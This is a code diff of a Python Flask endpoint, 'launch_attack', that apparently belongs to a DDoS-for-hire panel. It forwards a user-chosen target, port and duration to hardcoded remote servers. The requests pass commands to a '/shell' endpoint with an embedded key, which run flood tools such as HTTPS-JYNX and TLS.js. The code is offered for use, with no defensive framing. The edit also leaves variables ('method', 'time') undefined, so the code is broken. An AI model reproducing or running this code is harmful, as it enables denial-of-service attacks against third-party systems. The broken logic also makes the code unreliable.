@@ -131,7 +131,7 @@ def launch_attack():
     target = request.form['target']
     port = request.form['port']
     duration = request.form['duration']
-    method = request.form['method']
+    methods = request.form['methods']
 
     print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
     if method == "UDPFLOOD":
@@ -143,8 +143,8 @@ def launch_attack():
     elif method == "HTTPS-JYNX":
         url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
         requests.get(url)
-    elif method == "FREE-TLS":
-        url = f"http://188.166.212.32:2003/layer4?host={target}&port={port}&time={time}&methods=H2"
+    elif methods == "FREE-TLS":
+        url = f"http://188.166.212.32:2003/layer4?host={target}&port={port}&time={time}&methods={methods}"
         requests.get(url)
     elif method == "TLS":
         url = f"http://217.144.185.177:5000/shell?command=node TLS.js {target} {duration} 1 http2.txt&key=kriskaUSDEGR454T"
